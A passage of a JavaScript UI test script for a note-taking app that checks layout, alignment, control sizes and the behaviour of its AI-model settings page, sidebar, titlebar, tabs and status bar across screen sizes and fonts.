  // asked first, under its row; ← → move between the tabs; Change / Manage go to their tab
  const AI_LABEL = { none: 'Local AI · off', downloading: 'Downloading…', ready: 'Qwen3.5 4B', nogpu: 'Qwen3.5 2B', lowdisk: 'Qwen3.5 2B' };
  const AI_TABS = { overview: 'now lock noai', pc: 'local', cloud: 'cloud limits', jobs: 'jobs attach agent chat' };   // R67: the Agent's section; R68: the lock's
  for (const sc of Object.keys(SCREENS)) for (const state of Object.keys(AI_LABEL)) for (const tab of Object.keys(AI_TABS)) {
    aiDemo(state); AIS.tab = tab; S.setSec = 'ai'; set({ screen: sc, sample: 'typical', view: 'notes', side: true, modal: 'settings' });
    const k = `${sc}/${state}/${tab}`, pane = app.querySelector('.modal--settings .settings-pane'), body = pane.querySelector('.ais');
    measure(`ai/${k}`); inside('.modal--settings', k);
    if (pane.scrollWidth > pane.clientWidth + 1) iss('AI page scrolls sideways', k);
    const tabs = [...body.querySelectorAll('.ais-tab')].map(t => t.textContent + (t.getAttribute('aria-selected') === 'true' ? '*' : '')).join('|');
    const secs = [...body.querySelectorAll('.ais-sec')].map(s => s.dataset.aisSec).join(' ');
    if (secs !== AI_TABS[tab] || tabs.replace('*', '') !== 'Overview|On this PC|Cloud|Jobs and answers' || body.querySelector('[data-act="ais-layout"]')) iss('AI page: four tabs and their sections', `${k}: ${tabs} · ${secs}`);
    if ([...body.querySelectorAll('.ais-sec')].some(s => !s.querySelector('.ais-si')?.textContent.trim())) iss('AI page: each section says what it’s for', k);
    const bare = [...body.querySelectorAll('.set-row')].filter(r => !r.querySelector('.set-desc')?.textContent.trim()).map(r => r.querySelector('.set-label')?.textContent);
    if (bare.length) iss('AI page: every setting has one plain line', `${k}: ${bare.slice(0, 4).join(', ')}`);
    const hs = [...body.querySelectorAll('.btn')].filter(b => b.offsetWidth).map(b => [b.classList.contains('btn--sm') ? 28 : 32, Math.round(b.getBoundingClientRect().height)]);
    if (hs.some(([want, h]) => want !== h)) iss('AI page buttons off 28/32', `${k}: ${hs.map(x => x[1])}`);
    if (tab === 'pc') {
      const rows = [...body.querySelectorAll('.ais-lm')], off = rows.map(r => r.querySelector('[data-act="ai-dl"][disabled]')).filter(Boolean), lbl = app.querySelector('.status-bar [data-act="model"] .status-label')?.textContent;
      if (rows.length !== 6 || !rows[0].querySelector('.chip--accent')) iss('AI page: every model is a row, the best for this PC first', `${k}: ${rows.length} rows`);
      if (off.some(b => !document.getElementById(b.getAttribute('aria-describedby') || '')?.textContent.trim())) iss('AI page: a model that does not fit says why', k);
      if (state === 'lowdisk' && off.length !== 2) iss('AI page: the small PC should grey out 2 models', `${k}: ${off.length}`);
      if (rows.some(r => r.querySelectorAll('.ais-lm-act .btn, .ais-lm-act .chip').length > 2)) iss('AI page: one button per model', k);
      if (lbl !== AI_LABEL[state] || lbl.length > 'Ollama · local'.length) iss('status bar model name', `${k}: "${lbl}"`);
      if (sc === '1366x768' || sc === 'portrait1080') out.numbers.ai[k] = `${rows.length} model rows · ${off.length} greyed out · status "${lbl}" · page ${Math.round(pane.scrollHeight)}px`;
    }
  }
  for (const sc of Object.keys(SCREENS)) {   // the ask: the files, where from, how big; under the model's row
    aiDemo('none'); AIS.tab = 'pc'; S.setSec = 'ai'; set({ screen: sc, view: 'notes', modal: 'settings' });
    const rec = app.querySelector('.ais-lm'); rec.querySelector('[data-act="ai-dl"]').click(); const ask = app.querySelector('.ais-lm + .ais-sub .ai-confirm');
    if (!ask || !/github\.com\/ggml-org\/llama\.cpp/.test(ask.textContent) || !/huggingface\.co/.test(ask.textContent) || !/32 MB/.test(ask.textContent)) iss('download not asked first', sc);
    else { inside('.ai-confirm', `${sc}/ask`); measure(`ai/${sc}/ask`); if (document.activeElement?.id !== 'ai-ask-go') iss('the ask has no focus', sc); }
    app.querySelector('[data-act="ai-dl-no"]')?.click(); if (app.querySelector('.ai-confirm')) iss('Not now left the ask open', sc);
  }
  { aiDemo('ready'); AIS.tab = 'overview'; S.setSec = 'ai'; set({ screen: '1366x768', modal: 'settings' });   // ← → and Manage
    const tabs = [...app.querySelectorAll('.ais-tab')]; tabs[0]?.focus(); tabs[0]?.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowRight', bubbles: true })); const t2 = `${AIS.tab} focus ${document.activeElement?.id}`;
    app.querySelector('.ais-tab[data-v="overview"]').click(); app.querySelector('[data-ais-row="keys"] [data-act="ais-goto"]').click(); const t3 = `${AIS.tab}: ${[...app.querySelectorAll('.ais-panel .ais-sec')].map(s => s.dataset.aisSec).join(' ')}`;
    out.numbers.ai.tabs = `→ ${t2} · Manage → ${t3}`;
    if (t2 !== 'pc focus ais-tab-pc' || t3 !== 'cloud: cloud limits') iss('AI page: the tabs (← →, Manage)', out.numbers.ai.tabs); }
  // an icon inside a setting's description or a chip is never taller than its line (the user, of R60's mockup: "dont know why this setting
  // is this large"): every Settings page, each AI models tab, at 1366
  { const tall = []; aiDemo('ready'); cloudDemoFill(AI.st); set({ screen: '1366x768', modal: 'settings' });
    for (const [sec] of SET_SECTIONS) for (const tab of sec === 'ai' ? Object.keys(AI_TABS) : [null]) { if (SET_SOON[sec]) continue; S.setSec = sec; if (tab) AIS.tab = tab; renderAll();
      app.querySelectorAll('.settings-pane .set-desc svg, .settings-pane .chip svg').forEach(svg => { const box = svg.closest('.set-desc, .chip'), lh = parseFloat(getComputedStyle(box).lineHeight) || parseFloat(getComputedStyle(box).fontSize) * 1.5, h = svg.getBoundingClientRect().height;
        if (svg.getClientRects().length && h > lh + 1) tall.push(`${sec}${tab ? '/' + tab : ''}: ${Math.round(h)}px in a ${Math.round(lh)}px line`); }); }
    out.numbers.ai.icons = tall.length ? tall.slice(0, 4).join(' · ') : 'none taller than its line';
    if (tall.length) iss('an icon in a setting’s description or a chip is taller than its line', tall.slice(0, 4).join(' · ')); }
  AI.st = null; AI.demo = false; AIS.tab = 'overview'; S.setSec = 'appearance'; set({ modal: null });
  /* ---- R8: centred column; rail views don't open tabs; two panes; the timer pill ---- */
  out.numbers.centre = {}; out.numbers.split = {}; out.numbers.pill = {};
  for (const sc of Object.keys(SCREENS)) for (const view of ['notes', 'tasks', 'timer', 'history']) {
    S.split = null; S.mode = 'wysiwyg'; set({ screen: sc, view, sample: 'typical', tstate: 'running' }); measure(`centre/${sc}/${view}`);
    const v = app.querySelector('.view'), vi = v?.querySelector('.view-inner');
    if (vi) { const a = v.getBoundingClientRect(), b = vi.getBoundingClientRect(), l = b.left - a.left, r = a.right - b.right - (v.offsetWidth - v.clientWidth);
      out.numbers.centre[sc + '/' + view] = [Math.round(l), Math.round(r), Math.round(b.width)]; if (Math.abs(l - r) > 1.5) iss('not centred', `${sc}/${view} ${l.toFixed(1)} vs ${r.toFixed(1)}`); }
  }
  set({ screen: '1920x1080', view: 'notes', sample: 'typical' }); { const n0 = S.tabs.length; ['history', 'tasks', 'timer', 'notes'].forEach(v => app.querySelector(`.rail-btn[data-v="${v}"]`).click()); out.numbers.railTabs = `${n0} → ${S.tabs.length}`; if (S.tabs.length !== n0) iss('rail opened tabs', out.numbers.railTabs); }
  for (const sc of Object.keys(SCREENS)) for (const kind of ['note', 'tasks', 'timer', 'history']) {
    S.split = null; set({ screen: sc, view: 'notes', sample: 'stress', widgets: 'none', zen: 'off' });
    if (kind === 'note') { const t = mkTab('note', D.notes[3].id); S.tabs.push(t); pnSplitNote(t.id); } else pnDock(kind, 'beside'); out.combos++;   // Build M · R44: a note tab beside, or a module docked
    for (const pass of ['new', 'other']) {
      if (pass === 'other') { pnNext(); out.combos++; }
      measure(`split/${sc}/${kind}/${pass}`);
      if (app.querySelectorAll('.pane').length !== 2) iss('split missing', sc + '/' + kind);
      app.querySelectorAll('.pane .view').forEach(p => { if (p.scrollWidth > p.clientWidth + 1) iss('pane scrolls sideways', `${sc}/${kind}/${pass}`); });
    }
    out.numbers.split[sc] = [...app.querySelectorAll('.pane')].map(p => Math.round(p.offsetWidth)).join(' + ');
  }
  pnReset(); renderAll();
  for (const sc of Object.keys(SCREENS)) for (const tstate of ['running', 'paused', 'idle']) {
    set({ screen: sc, view: 'notes', sample: 'stress', tstate });
    const p = app.querySelector('.top-btn--timer'); if ((tstate !== 'idle') !== !!p) iss('timer pill wrong', sc + '/' + tstate);
    if (p) { out.numbers.pill[sc] = Math.round(p.offsetWidth); inside('.top-btn--timer', sc); }
  }
  /* ---- R9: row bottoms line up; window-bar columns line up with the panels; one icon size ---- */
  out.numbers.rows = {}; out.numbers.icons = {};
  for (const sc of Object.keys(SCREENS)) for (const side of [true, false]) for (const view of ['notes', 'tasks', 'timer', 'history']) {
    set({ screen: sc, view, side, sample: 'stress', tstate: 'running', inspector: 'shown', zen: 'off' }); measure(`rows/${sc}/${side}/${view}`);
    const rows = ['.side-actions, .side-head', '.app-header', '#right-sidebar .tabs'].map(s => app.querySelector(s)).filter(el => el && el.offsetParent).map(el => half(px(el).b));
    out.numbers.rows[`${sc}/${view}`] = [...new Set(rows)]; if (new Set(rows).size > 1) iss('header rows differ', `${sc}/${side}/${view}: ${rows}`);
    const main = app.querySelector('.main'), strip = app.querySelector('.titlebar .tabstrip'), tl = app.querySelector('.tb-left'), sb = app.querySelector('#left-sidebar');
    if (side && strip && Math.abs(px(strip).l - px(main).l + 1) > .5) iss('tab strip off the sidebar line', `${sc}/${view} ${(px(strip).l - px(main).l).toFixed(1)}`);   // R11: the first tab's border lies on the sidebar's edge line
    if (sb && side && Math.abs(px(tl).r - px(sb).r) > .5) iss('left bar column off', `${sc}/${view} ${(px(tl).r - px(sb).r).toFixed(1)}`);
    app.querySelectorAll('.titlebar button svg, .rail button svg, .side-actions button svg, .side-head button svg, .app-header button svg, .ed-toolbar button svg, #right-sidebar button svg').forEach(s => {
      if (s.closest('.win-btn, .ws-tab, .ed-caret, .tag-chip, .trail-pill') || !s.getBoundingClientRect().width) return; const w = Math.round(s.getBoundingClientRect().width); out.numbers.icons[w] = (out.numbers.icons[w] || 0) + 1; });
  }
  if (Object.keys(out.numbers.icons).some(w => w !== '18')) iss('icon sizes differ', JSON.stringify(out.numbers.icons));
  /* ---- Build C (QC round 1): the reading notice's icon is 16px and the read bar leaves the note's last line clear;
     _inbox.md and stickynoted are pinned under the scrolling tree, centred on light/dark and Settings to within 0.5px ---- */
  out.numbers.buildC = { read: {}, pinned: {} };
  for (const sc of Object.keys(SCREENS)) {
    S.split = null; set({ screen: sc, sample: 'typical', view: 'notes', side: true, inspector: 'shown', widgets: 'none', zen: 'off', modal: null }); fire('read');
    const svg = app.querySelector('.reading-note > svg'), bar = app.querySelector('.readbar'), v = app.querySelector('.view--note'), doc = app.querySelector('.doc');
    if (!svg || !bar || !v || !doc) { iss('Build C: reading notice or read bar missing', sc); closeModal(); continue; }
    const s = svg.getBoundingClientRect(); if (Math.round(s.width) !== 16 || Math.round(s.height) !== 16) iss('Build C: reading notice icon not 16px', `${sc} ${s.width}×${s.height}`);
    const fill = Array.from({ length: 60 }, (_, i) => doc.appendChild(Object.assign(document.createElement('p'), { textContent: 'Line ' + i })));   // a long note, in the page only
    v.scrollTop = v.scrollHeight; const gap = bar.getBoundingClientRect().top - doc.lastElementChild.getBoundingClientRect().bottom;
    out.numbers.buildC.read[sc] = `icon ${Math.round(s.width)}px · last line ${gap.toFixed(1)}px above the bar`; if (gap < 0) iss('Build C: read bar covers the last line', out.numbers.buildC.read[sc]);
    fill.forEach(p => p.remove()); closeModal();
  }
  const pin = (k, more) => {
    set({ view: 'notes', side: true, modal: null, ...more }); const sys = app.querySelector('#left-sidebar > .tree-sys'), body = app.querySelector('#left-sidebar .side-body');
    if (!sys) { iss('Build C: _inbox.md and stickynoted not pinned', k); return; }
    body.scrollTop = body.scrollHeight;   // the list scrolls, the two rows stay put
    const d = [['inbox', 'theme-toggle'], ['stickies', 'settings']].map(([r, b]) => cy(sys.querySelector(`[data-tree="${r}"]`)) - cy(app.querySelector(`.rail [data-act="${b}"]`)));
    out.numbers.buildC.pinned[k] = d.map(x => x.toFixed(2)).join(' / ') + (body.scrollHeight > body.clientHeight + 1 ? ' · list scrolls' : '');
    if (d.some(x => Math.abs(x) > .5)) iss('Build C: pinned rows off the rail buttons', `${k} ${out.numbers.buildC.pinned[k]}`);
    inside('.tree-sys', k); measure(`buildC/${k}`);
  };
  for (const sc of Object.keys(SCREENS)) for (const sample of ['typical', 'stress']) for (const q of ['', 'zzz']) {
    S.search = q; set({ screen: sc, sample }); [...D.projects, ...D.folders].forEach(f => S.open.add(f.id)); pin(`${sc}/${sample}${q ? '/search' : ''}`);
  }
  S.search = '';
  for (const more of [{ font: 'opendyslexic' }, { textsize: 'l' }]) pin(`1366x768/${Object.values(more)[0]}`, { screen: '1366x768', sample: 'stress', ...more });
  set({ font: keep.reader.font, textsize: keep.reader.textsize || 'm' });
  { set({ screen: '1920x1080', sample: 'typical', view: 'notes', side: true, modal: null }); const row = k => app.querySelector(`.tree-sys [data-tree="${k}"]`), r = {};
    row('inbox').click(); r.click = typeof LD !== 'undefined' && LD.list ? 'list' : S.modal; if (typeof LD !== 'undefined') LD.list = null; closeModal(); renderAll();   // Build O (R47): the row opens its list, never the capture bar
    const b = row('stickies').getBoundingClientRect(); row('stickies').dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: b.left + 8, clientY: b.top + 8 })); r.menu = S.ctx?.kind; S.ctx = null; renderAll();
    const rows = [...app.querySelectorAll('[data-tree]')], before = rows[rows.indexOf(row('inbox')) - 1]; before.focus(); before.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowDown', bubbles: true })); r.key = document.activeElement.dataset.tree;
    out.numbers.buildC.rows = `click ${r.click} · right-click ${r.menu} · ↓ ${r.key}`; if (r.click !== 'list' || r.menu !== 'stickies' || r.key !== 'inbox') iss('Build C: pinned rows behaviour', out.numbers.buildC.rows); }
  /* ---- R10: capture group, no bar lines, tab text on the bar line, rail rows, toolbar, tab overflow, quick timer, control scale, text size ---- */
  out.numbers.caps = {}; out.numbers.rail = {}; out.numbers.toolbar = {}; out.numbers.tabs = {}; out.numbers.qt = {}; out.numbers.offScale = {}; out.numbers.tiny = 0;
  for (const sc of Object.keys(SCREENS)) for (const side of [true, false]) {
    set({ screen: sc, side, view: 'notes', sample: 'typical', tstate: 'running', zen: 'off' }); measure(`caps/${sc}/${side}`);
    const caps = ['sticky-new', 'dump', 'voice'].map(a => app.querySelector(`.titlebar [data-act="${a}"]`)), capEnd = app.querySelector('.titlebar .tb-caps > :last-child');   // R54 C: the group ends with Wrap up
    if (caps.some(b => !b) || new Set(caps.map(b => b.parentElement)).size > 1) iss('capture split up', `${sc}/${side}`);
    else if (side) { const sb = app.querySelector('#left-sidebar'), d = (px(caps[0]).l + px(capEnd).r) / 2 - (px(sb).l + px(sb).r) / 2; out.numbers.caps[sc] = half(d); if (Math.abs(d) > .5) iss('capture not centred over the sidebar', `${sc} Δ${d.toFixed(1)}`); }
    const tb = app.querySelector('.titlebar'); if ([...tb.querySelectorAll('.tb-left, .tb-right')].some(el => parseFloat(getComputedStyle(el).borderRightWidth) || parseFloat(getComputedStyle(el).borderLeftWidth))) iss('window bar lines', `${sc}/${side}`);
    const tt = tb.querySelector('.ws-tab-title'), plus = tb.querySelector('.tab-new'); if (tt && Math.abs(cy(tt) - cy(plus)) > 1) iss('tab text off the bar line', `${sc} Δ${(cy(tt) - cy(plus)).toFixed(1)}`);
  }
  S.side = true;
  for (const sc of Object.keys(SCREENS)) {
    set({ screen: sc, view: 'notes', sample: 'typical', side: true });
    const rb = [...app.querySelectorAll('.rail button')], last = rb[rb.length - 1], d = half(px(app.querySelector('.rail')).b - px(last).b - 8);   // QC 73: 8px off the window's bottom, as from the rail's sides (was: on the status bar row)
    out.numbers.rail[sc] = { firstTop: half(px(rb[0]).t), settingsOffItsInset: d, size: rb[0].offsetHeight }; if (Math.abs(d) > .5) iss('Settings not 8px off the window\'s bottom (QC 73)', `${sc}: ${d}`);
    if (half(px(rb[0]).t) !== 40) iss('rail not 4px under the window bar', `${sc}: ${px(rb[0]).t}`); if (rb[0].offsetHeight !== 28) iss('rail button not 28px', sc);
    const z = app.querySelector('.ed-toolbar--zones'); if (z) { const lines = {}; z.querySelectorAll('.ed-btn, select').forEach(b => { if (b.offsetWidth) (lines[Math.round(cy(b))] ||= []).push(b); });
      const hid = z.querySelectorAll('.ed-zone .is-ovf').length; out.numbers.toolbar[sc] = `${Object.keys(lines).length} line · ${Object.values(lines).flat().length} shown · ${hid} under ⋯`;
      if (Object.keys(lines).length > 1) iss('editor toolbar not one row', sc); if (z.scrollWidth > z.clientWidth + 1) iss('editor toolbar overflows', sc); }
    for (const sample of ['typical', 'stress']) { set({ sample }); tabOverflow(); const strip = app.querySelector('.titlebar .tabstrip'), over = strip.scrollWidth > strip.clientWidth + 1, list = app.querySelector('.tab-list'), plus = app.querySelector('.tab-new');
      out.numbers.tabs[`${sc}/${sample}`] = `${S.tabs.length} tabs, ${over ? 'overflow · list' : 'fit'}`;
      if (over !== !!list.offsetWidth || plus.closest('.tabstrip') || !plus.offsetWidth || px(plus).r > app.offsetWidth) iss('tab overflow without a cue', `${sc}/${sample}`); }
    set({ sample: 'typical', widgets: 'timer' }); anchorQt(); { const w = app.querySelector('.widget.qt'), b = app.querySelector('.titlebar [data-act="qt-toggle"]'), dx = (px(w).l + px(w).r) / 2 - (px(b).l + px(b).r) / 2;
      out.numbers.qt[sc] = Math.round(dx); if (px(w).l < 0 || px(w).r > app.offsetWidth || (Math.abs(dx) > 1 && px(w).l > 5 && px(w).r < app.offsetWidth - 5)) iss('quick timer not under its button', `${sc} Δ${dx.toFixed(0)}`); }
    set({ widgets: 'none' });
    for (const view of ['notes', 'tasks', 'timer', 'history', 'newtab']) { set({ view });
      app.querySelectorAll('button, input, select, [role="button"]').forEach(el => { if (!el.offsetWidth || el.matches('.win-btn, .list-item, .tabs .tab, .note-title, textarea, [type="checkbox"], [type="radio"], [type="range"]')) return;
        const h = Math.round(el.getBoundingClientRect().height); if (![24, 28, 32, 36].includes(h)) { const k = `${h}px ${el.className.split(' ')[0]}`; out.numbers.offScale[k] = (out.numbers.offScale[k] || 0) + 1; } });
      app.querySelectorAll('*').forEach(el => { if (el.offsetWidth && [...el.childNodes].some(n => n.nodeType === 3 && n.textContent.trim()) && parseFloat(getComputedStyle(el).fontSize) < 10.95) out.numbers.tiny++; }); }
  }
  if (Object.keys(out.numbers.offScale).length) iss('controls off the 24/28/32/36 scale', Object.keys(out.numbers.offScale).join(', '));
  if (out.numbers.tiny) iss('text under 11px', out.numbers.tiny);
  set({ view: 'newtab' }); set({ view: 'notes' }); { const titles = S.tabs.map(tabTitle); if (titles.length !== new Set(titles).size) iss('duplicate tabs', titles.join(', ')); }
  /* ---- R11: tab edge, 40px top row, right toggle beside the window buttons ---- */
  out.numbers.tabEdge = {}; out.numbers.topRow = {}; out.numbers.rtoggle = {};
  for (const sc of Object.keys(SCREENS)) {
    set({ screen: sc, view: 'notes', sample: 'typical', inspector: 'shown' });
    const tab = app.querySelector('.titlebar .ws-tab'), sb = app.querySelector('#left-sidebar'); out.numbers.tabEdge[sc] = half(px(tab).l - (px(sb).r - 1)); if (Math.abs(out.numbers.tabEdge[sc]) > .5) iss('tab edge off the sidebar line', `${sc} Δ${out.numbers.tabEdge[sc]}`);
    const hs = [...new Set(['.side-actions', '.app-header', '#right-sidebar .tabs'].map(q => app.querySelector(q)).map(el => Math.round(el.getBoundingClientRect().height)))];
    const btnH = [...new Set([...app.querySelectorAll('.side-actions button, .app-header button:not(.crumb-folder)')].filter(b => b.offsetWidth).map(b => Math.round(b.getBoundingClientRect().height)))];
    out.numbers.topRow[sc] = `rows ${hs} · buttons ${btnH}`; if (hs.length > 1 || hs[0] !== 40) iss('top row height', `${sc}: ${hs}`); if (btnH.length > 1 || btnH[0] !== 28) iss('top row buttons', `${sc}: ${btnH}`);
    for (const inspector of ['shown', 'hidden']) { set({ inspector }); const tg = app.querySelector('.tb-right [data-act="inspector"]'), mn = app.querySelector('.win-btn'), sep = app.querySelector('.tb-right .tb-sep--win');
      const gap = Math.round(px(mn).l - px(tg).r); out.numbers.rtoggle[`${sc}/${inspector}`] = gap; if (!sep || px(sep).l < px(tg).r || px(sep).r > px(mn).l || gap > 24) iss('right toggle not beside the window buttons', `${sc}/${inspector} gap ${gap}`); }
  }
  /* ---- R12: no outline on the note's text; controls keep their focus ring ---- */
  set({ screen: '1920x1080', view: 'notes', inspector: 'shown' }); { const d = app.querySelector('#note-body-editor'); d.focus(); out.numbers.docOutline = getComputedStyle(d).outlineStyle; d.blur(); if (out.numbers.docOutline !== 'none') iss('note text outline', out.numbers.docOutline); }
  /* ---- R14: no lines under the sidebar headers; Notes actions and Search in one row, in every font ---- */
  for (const view of ['notes', 'tasks']) { set({ view });
    const seen = ['.side-actions, .side-head', '#right-sidebar .tabs', '.app-header'].map(q => app.querySelector(q)).map(el => el && el.offsetParent ? (/rgba\(.*, 0\)$|transparent/.test(getComputedStyle(el).borderBottomColor) ? 'none' : 'line') : '-');
    if (seen.slice(0, 2).some(v => v !== '-' && v !== 'none') || seen[2] !== 'line') iss('header lines', `${view}: ${seen}`); }
  out.numbers.sideRow = {};
  for (const sc of Object.keys(SCREENS)) for (const [font] of FONTS) { set({ screen: sc, view: 'notes', font, state: 'ready', sample: 'typical' });
    const sa = app.querySelector('.side-actions'), f = app.querySelector('#search-input'), row = app.querySelector('[data-tree]'), b0 = sa.querySelector('button'), cs = getComputedStyle(f), c = document.createElement('canvas').getContext('2d'); c.font = cs.font;
    const room = f.clientWidth - parseFloat(cs.paddingLeft) - parseFloat(cs.paddingRight), need = Math.ceil(c.measureText(f.placeholder).width);
    const dl = half(px(b0).l - px(row).l), dr = half(px(f).r - px(row).r), dy = half(cy(f) - cy(b0)), h = Math.round(f.getBoundingClientRect().height);
    out.numbers.sideRow[`${sc}/${font}`] = `first action ${dl} · search right ${dr} · Δy ${dy} · field ${h} · "${f.placeholder}" ${need}/${room}px`;
    if (need > room) iss('search placeholder clipped', `${sc}/${font}: ${need}/${room}`);
    if (!sa.contains(f) || Math.abs(dl) > .5 || Math.abs(dr) > .5 || Math.abs(dy) > .5 || h !== 28) iss('sidebar row off', `${sc}/${font}: l${dl} r${dr} y${dy} h${h}`); }
  set({ font: 'opendyslexic' });
  /* ---- R20 (R17): the timer ends 8px before the right sidebar's edge; R54 C: wrap-up is after Voice ramble, Search and the toggle keep their places ---- */
  out.numbers.windowBar = {};
  for (const sc of Object.keys(SCREENS)) for (const inspector of ['shown', 'hidden']) for (const tstate of ['running', 'idle']) { set({ screen: sc, view: 'notes', inspector, tstate });
    const first = app.querySelector('.tb-actions').firstElementChild, ins = app.querySelector('#right-sidebar'), tg = app.querySelector('.tb-right [data-act="inspector"]'), wrap = app.querySelector('.titlebar [data-act="wrap"]'), sep = app.querySelector('.tb-sep--win');   // R54 C: wrap-up sits after Voice ramble
    if (inspector === 'shown') { const clear = half(px(ins).l - px(first).r), dx = half(px(sep).l - px(tg).r - 16);   // R54 C: Search and the toggle keep their places, the toggle 16px before the divider
      out.numbers.windowBar[`${sc}/${tstate}`] = `timer ends ${clear}px before the edge · toggle off its place ${dx}`;
      if (clear !== 8 || Math.abs(dx) > .5 || wrap.previousElementSibling?.dataset.act !== 'voice' || !wrap.closest('.tb-caps')) iss('window bar (R20, R54 C)', `${sc}/${tstate}: ${out.numbers.windowBar[`${sc}/${tstate}`]}`); }
    else { const pal = app.querySelector('.titlebar [data-act="palette"]'), gap = half(px(tg).l - px(pal).r); out.numbers.windowBar[`${sc}/${tstate}/hidden`] = `gap to toggle ${gap}`; if (gap !== 2) iss('window bar, right sidebar hidden', `${sc}: ${gap}`); } }
  set({ inspector: 'shown', tstate: 'running' });
  /* ---- R19: the path's lowercase letters centred on Back's arrow in every font; folder boxes centred on the row ---- */
  out.numbers.crumb = {};
  for (const [font] of FONTS) { set({ screen: '1920x1080', view: 'notes', font, sample: 'typical' }); await document.fonts.ready; alignCrumb();
    const h = app.querySelector('.app-header'), t = h.querySelector('.crumb-label'), probe = document.createElement('span'); probe.style.cssText = 'display:inline-block;width:0;height:0;vertical-align:baseline'; t.appendChild(probe);
    const base = probe.getBoundingClientRect().top; probe.remove(); const c = document.createElement('canvas').getContext('2d'); c.font = getComputedStyle(t).font;
    const xh = c.measureText('xnmao').actualBoundingBoxAscent, sv = h.querySelector('[data-act="back"] svg').getBoundingClientRect(), mid = (sv.top + sv.bottom) / 2, b = h.querySelector('.crumb-folder').getBoundingClientRect();
    const dX = Math.round((base - xh / 2 - mid) * 4) / 4, dB = Math.round(((b.top + b.bottom) / 2 - mid) * 4) / 4;
    out.numbers.crumb[font] = `lowercase ${dX} · folder box ${dB}`; if (Math.abs(dX) > .5 || Math.abs(dB) > .5) iss('note path off the arrows', `${font}: ${out.numbers.crumb[font]}`); }
  set({ font: 'opendyslexic' });
  /* ---- R18: Back 8px from the left sidebar's edge; nothing in the header overlaps ---- */
  out.numbers.headStart = {};
  for (const sc of Object.keys(SCREENS)) { set({ screen: sc, view: 'notes', inspector: 'shown' });
    const h = app.querySelector('.app-header'), back = h.querySelector('[data-act="back"]'), crumb = h.querySelector('.crumb'), acts = h.querySelector('.header-actions');
    const d = half(px(back).l - px(app.querySelector('.main')).l), room = half(px(acts).l - px(crumb).r);
    out.numbers.headStart[sc] = `Back ${d}px from the edge · ${room}px to the actions`; if (d !== 8 || room < 0) iss('note header start', `${sc}: ${d} ${room}`); }
  /* ---- R16 / R18: underline tabs for Outline / Backlinks / Tags: nothing moves or goes bold; labels fit; hover like Ollama · local ---- */
  out.numbers.inspTabs = {};
  for (const sc of Object.keys(SCREENS)) for (const [font] of FONTS) { set({ screen: sc, view: 'notes', inspector: 'shown', font });
    const rects = [], weights = new Set();
    for (const k of ['outline', 'backlinks', 'tags']) { S.tab = k; renderAll(); const tabs = [...app.querySelectorAll('#right-sidebar .tab')];
      rects.push(tabs.map(t => { const r = px(t); return [r.l, r.r, r.t, r.b].map(half).join(','); }).join(' ')); tabs.forEach(t => weights.add(getComputedStyle(t).fontWeight)); }
    S.tab = 'outline'; renderAll();
    const row = app.querySelector('#right-sidebar .tabs'), tabs = [...row.querySelectorAll('.tab')], lab = tabs.map(t => t.querySelector('.tab-label'));
    const clipped = lab.filter(l => l && l.scrollWidth > l.parentElement.clientWidth - parseFloat(getComputedStyle(l.parentElement).paddingLeft) * 2 + .5).map(l => l.textContent);
    const hs = [...new Set(tabs.map(t => Math.round(t.getBoundingClientRect().height)))];
    tabs[1].classList.add('is-hover'); const sl = app.querySelector('.status-link'); sl.classList.add('is-hover');
    const hov = ['backgroundColor', 'color'].every(k => getComputedStyle(tabs[1])[k] === getComputedStyle(sl)[k]); tabs[1].classList.remove('is-hover'); sl.classList.remove('is-hover');
    const line = getComputedStyle(tabs[0]).borderBottomColor !== getComputedStyle(tabs[1]).borderBottomColor, radius = getComputedStyle(tabs[0]).borderRadius;
    if (font === 'opendyslexic') out.numbers.inspTabs[sc] = `moves ${new Set(rects).size > 1} · weights ${[...weights]} · height ${hs} · hover like Ollama ${hov} · underline on the open tab ${line} · corners ${radius} · clipped ${clipped.join('/') || 'none'}`;
    if (new Set(rects).size > 1 || weights.size > 1) iss('tabs move or go bold', `${sc}/${font}`);
    if (clipped.length) iss('tab label clipped', `${sc}/${font}: ${clipped}`);
    if (!hov || !line || radius !== '0px' || hs.join() !== String(row.clientHeight)) iss('underline tabs off', `${sc}/${font}: hover ${hov} line ${line} radius ${radius} height ${hs}`); }
  set({ font: 'opendyslexic' });
  /* ---- R15: lean status bar ---- */
  out.numbers.status = {};
  for (const state of ['ready', 'saving', 'error']) { status.clear(); set({ screen: '1920x1080', view: 'notes', state });
    const sb = app.querySelector('.status-bar'), save = sb.querySelector('.status-save'), shown = !!(save && save.offsetWidth);
    out.numbers.status[state] = `save status ${shown ? 'shown' : 'hidden'}`; if (shown !== (state !== 'ready')) iss('status bar save status', state);
    if (!sb.querySelector('#status-text') || sb.querySelector('.trail-label')?.textContent !== 'Timeline' || sb.querySelector('[data-act="backlinks"]')) iss('status bar ids, label or extras', state); }
  set({ state: 'ready' }); status('Created a new note'); renderAll(); { const news = !!app.querySelector('.status-save')?.offsetWidth; status.clear(); const after = !!app.querySelector('.status-save')?.offsetWidth;
    out.numbers.status.news = `message shown ${news} · hidden after ${!after}`; if (!news || after) iss('status message', out.numbers.status.news); }
  /* ---- Coming soon: every unbuilt control is dimmed, says so, and does nothing ---- */
  { set({ screen: '1920x1080', view: 'notes', sample: 'typical', inspector: 'shown' }); S.menu = true; renderAll(); const soons = [...app.querySelectorAll('[data-soon]')];
    out.numbers.comingSoon = soons.map(el => el.getAttribute('title').replace(' · Coming soon', ''));
    soons.forEach(el => { if (el.getAttribute('aria-disabled') !== 'true' || !/ · Coming soon$/.test(el.getAttribute('title'))) iss('coming soon not marked', el.getAttribute('title')); });
    const before = JSON.stringify([UI, S.modal, S.tabs.length]); soons.forEach(el => app.contains(el) && el.click()); if (JSON.stringify([UI, S.modal, S.tabs.length]) !== before) iss('a coming-soon control did something', before);
    S.menu = false; renderAll(); }
  /* ---- Reader settings: theme, dark family, font, text size; the rail's light/dark button ---- */
  { set({ theme: 'obsidian' }); READER.lastLight = 'sage'; const save = window.setReader; window.setReader = (k, v) => { READER[k] = v; if (k === 'theme' && !DARK_THEMES.includes(v)) READER.lastLight = v; applyReader(); };
    app.querySelector('[data-act="theme-toggle"]').click(); const toLight = document.body.dataset.theme + '/' + document.body.dataset.dark;
    app.querySelector('[data-act="theme-toggle"]').click(); const toDark = document.body.dataset.theme + '/' + document.body.dataset.dark; window.setReader = save;
